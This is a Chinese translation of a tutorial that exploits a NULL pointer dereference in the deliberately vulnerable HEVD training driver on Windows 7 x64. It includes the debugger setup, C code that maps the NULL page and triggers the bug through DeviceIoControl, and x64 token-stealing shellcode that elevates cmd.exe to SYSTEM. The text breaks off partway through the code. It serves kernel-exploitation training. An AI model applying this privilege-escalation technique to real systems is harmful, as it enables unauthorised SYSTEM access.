# Windows 10内核驱动漏洞利用：空指针引用
|
##### 译文声明
本文是翻译文章，文章原作者 XPN，文章来源：xpnsec.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在这一系列文章中，我们通过HackSys团队提供的HEVD驱动程序，来探索内核驱动程序的漏洞利用方式。  
这一次，我们将关注空指针引用（NULL pointer
dereferences，其中dereference一词是指取指针指向的对象的值，请大家务必理解这个名词，并不是常规意义上的引用），并演示如何在Windows
7 x64和Windows 10 x32上利用这类漏洞。  
空指针引用错误正在逐渐成为现代操作系统上漏洞利用的一个难题。由于Windows
8以及更高版本中，用户模式进程无法使用NULL页，所以看起来，此类漏洞已经被缓解。  
然而，我们知道，Windows 7仍然是很多人都在使用的流行的操作系统。并且，由于向后兼容性，Windows 10的32位版本存在一个弱点。  
为了展现在这些操作系统上漏洞利用的一些细微差别，我们会尝试进行两次漏洞攻击，目的是实现对SYSTEM用户的权限提升。
## 实验环境配置
在本教程中，我们将在实验环境中部署3个虚拟机：调试虚拟机、Windows 7 x64虚拟机、Windows 10 x32虚拟机。  
如果您还没有阅读本系列的第一篇文章，我强烈建议您先进行阅读：
，这篇文章中详细讲解了如何设置环境以及如何将内核调试程序连接到Windows 10虚拟机的详细方法。  
在这篇文章中，还讲解了如何在VirtualBox中设置一个用于内核调试的Windows 7主机。如果您还有印象的话，我们以前曾经使用过Windows
10内核调试器的NET选项，但在早期版本中并不支持这一功能。因此，我们将恢复使用虚拟串行端口（Virtual Serial Port）。  
首先，在您的Windows 7虚拟主机的设置中，选择“端口”，并确保已经启用串行端口。作为macOS用户，我被要求提供一个命名管道（Named
Pipe）的路径，在不同操作系统上可能会有所不同。  
选择“连接到现有管道/Socket”选项非常重要，它将会允许虚拟串行端口在需要时建立与内核调试器VM的连接。  
接下来，在我们的调试虚拟机上，需要进行一个类似的配置，提供相同的命名管道路径，但这次我们要确保不选择“连接到现有管道/Socket”选项。  
现在，在您的调试主机上，设置WinDBG通过COM端口连接：  
在Windows 7主机上，在管理员权限命令提示符中输入以下内容：  
bcdedit /debug on bcdedit /dbgsettings SERIAL  
重新启动Windows 7主机，WinDBG就可以正常使用了。  
现在我们已经完成了虚拟机的设置，接下来就让我们来研究这个漏洞。
## 漏洞分析
与我们的HEVD步骤的第一部分类似，首先我们回顾一下即将要实现的功能的源代码，在此例中是TriggerNullPointerDereference。  
该函数首先在栈中分配一些变量：
    NTSTATUS TriggerNullPointerDereference(IN PVOID UserBuffer) {     ULONG UserValue = 0;     ULONG MagicValue = 0xBAD0B0B0;     NTSTATUS Status = STATUS_SUCCESS;   PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;
NullPointerDereference变量是一个指向分配的内存块的指针：
    // Allocate Pool chunk
        NullPointerDereference = (PNULL_POINTER_DEREFERENCE)
                                  ExAllocatePoolWithTag(NonPagedPool,
                                                        sizeof(NULL_POINTER_DEREFERENCE),
                                                        (ULONG)POOL_TAG);
一旦分配完成，我们的DeviceloControl输入缓冲区就会被处理，并从内存读取ULONG并存储在UserValue变量中：
    // Get the value from user mode     UserValue = *(PULONG)UserBuffer;
然后，使用if语句来验证用户模式应用程序传递的值实际上是否设置为MagicValue。如果未设置，则释放先前分配的内存：
    // Validate the magic value
        if (UserValue == MagicValue) {
            ...
        }
        else {
            DbgPrint("[+] Freeing NullPointerDereference Objectn");
            DbgPrint("[+] Pool Tag: %sn", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%pn", NullPointerDereference);
            // Free the allocated Pool chunk
            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);
            // Set to NULL to avoid dangling pointer
            NullPointerDereference = NULL;
       }
最后，我们发现NullPointerDereference变量被用来调用一个函数指针：
        DbgPrint("[+] Triggering Null Pointer Dereferencen");
        // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
        // because the developer is not validating if 'NullPointerDereference' is NULL
        // before calling the callback function
    NullPointerDereference->Callback();
这就意味着，由于在使用前缺少对NullPointerDereference变量的检查，因此就存在空指针引用漏洞。如果应用程序触发一个DeviceloControl调用，传递一个与MagicValue不匹配的值，然后再NULL处提供一个函数指针（偏移量为0x4或0x8，我们稍后会提及），就能够被利用。  
然而，在许多现代操作系统中，NULL页不再可用，这就意味着这样的漏洞会更难以利用。  
接下来，我们将开始介绍如何在Windows 7上利用这类漏洞，我们知道Windows 7不受NULL页保护。
## Windows 7漏洞利用
Windows 7为攻击者提供了一个选项，通过ZwAllocateVirtualMemory的API调用来映射NULL页，其具有以下签名：
    NTSTATUS ZwAllocateVirtualMemory(
      _In_    HANDLE    ProcessHandle,
      _Inout_ PVOID     *BaseAddress,
      _In_    ULONG_PTR ZeroBits,
      _Inout_ PSIZE_T   RegionSize,
      _In_    ULONG     AllocationType,
      _In_    ULONG     Protect
    );
我们特别感兴趣的是BaseAddress参数：  
“该参数是指向一个变量的指针，该变量会接收分配的页面区域的基地址。如果此参数的初始值非NULL，则从指定的虚拟地址开始分配区域，并向下舍入到下一个主机页大小的地址边界。如果此参数的初始值为NULL，则操作系统将会确定分配区域的位置。”  
这意味着，如果我们请求1h的BaseAddress，NULL页将被映射到进程地址空间中，可以任意使用。这是我们用来捕获尝试访问NULL地址的过程。  
现在，我们知道可以去触发一个空指针引用，而且我们也知道下面的调用负责一个回调函数的调用：
    NullPointerDereference->Callback();
接下来，我们迅速查看与NullPointerDereference变量关联的类型，可以发现能在64位系统上偏移量0x8处找到Callback属性：
    typedef struct _NULL_POINTER_DEREFERENCE {
        ULONG Value;
        FunctionPointer Callback;
    } NULL_POINTER_DEREFERENCE, *PNULL_POINTER_DEREFERENCE;
因此，我们利用该漏洞，在NULL页分配内存，并在地址8h处设置一个指向我们Shellcode的指针（我们现在只使用一个cc
Int-3d断点作为Shellcode），如下所示：
    // Get a pointer to the internal ZwAllocateVirtualMemory call
    typedef NTSTATUS (* WINAPI ZwAllocateVirtualMemory)(
        _In_    HANDLE    ProcessHandle,
        _Inout_ PVOID     *BaseAddress,
        _In_    ULONG_PTR ZeroBits,
        _Inout_ PSIZE_T   RegionSize,
        _In_    ULONG     AllocationType,
        _In_    ULONG     Protect
    );
    ZwAllocateVirtualMemory _ZwAllocateVirtualMemory = (ZwAllocateVirtualMemory)GetProcAddress(LoadLibraryA("ntdll.dll"), "ZwAllocateVirtualMemory");
    // Map the NULL page into our process address space
    PVOID memAddr = (PVOID)1;
    SIZE_T regionSize = 4096;
    NTSTATUS alloc = _ZwAllocateVirtualMemory(
        GetCurrentProcess(), 
        &memAddr, 
        0, 
        &regionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    // Add our breakpoint shellcode
    memset((void*)0x100, 'xcc', 0x100);
    // Set the Callback() address
    *(unsigned long long*)0x8 = 0x100;
为了与驱动程序交互，并触发漏洞，我们将使用与此前文章中类似的一组调用：
    HANDLE driverHandle = CreateFileA(
        "\\.\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    char exploit[1024];
    memset(exploit, 'A', sizeof(exploit));
    DeviceIoControl(
        driverHandle,
        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
        exploit,
        sizeof(exploit),
        NULL,
        0,
        NULL,
        NULL
    );
编译后运行，我们得到如下结果：  
非常棒，目前我们已经控制了rip地址。在这个阶段，我们希望使用此前文章中的Shellcode，并且得到我们的SYSTEM
Shell。然而请注意，我们以前的Shell是为Windows 10开发的，而现在正在对Win
7进行漏洞利用的尝试，因此我们需要调整Shellcode的偏移量，以匹配早期的Windows版本。  
最简单的方法是在WinDBG中使用dt命令，例如：
    dt nt!_KPRCB
在所有的偏移量都更新之后，得到的Shellcode如下：
    [BITS 64]
      push rax
      push rbx
      push rcx
      push rsi
      push rdi
      mov rax, [gs:0x180 + 0x8]   ; Get 'CurrentThread' from KPRCB
      mov rax, [rax + 0x210]       ; Get 'Process' property from current thread
    next_process:
      cmp dword [rax + 0x180], 0x41414141  ; Search for 'cmd.exe' process ('AAAA' replaced by exploit)
      je found_cmd_process
      mov rax, [rax + 0x188]            ; If not found, go to next process
      sub rax, 0x188
      jmp next_process
    found_cmd_process:
      mov rbx, rax                     ; Save our cmd.exe EPROCESS for later
    find_system_process:
      cmp dword [rax + 0x180], 0x00000004  ; Search for PID 4 (System process)
      je found_system_process
      mov rax, [rax + 0x188]
      sub rax, 0x188
      jmp find_system_process
    found_system_process:
      mov rcx, [rax + 0x208]            ; Take TOKEN from System process
      mov [rbx+0x208], rcx              ; And copy it to the cmd.exe process
      pop rdi
      pop rsi
      pop rcx
      pop rbx
      pop rax
剩下要做的，就是产生一个新的cmd.exe进程，并更新我们的Shellcode来搜索正确的进程PID：
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOA);
    if (!CreateProcessA(
        NULL,
        (LPSTR)"cmd.exe",
        NULL,
        NULL,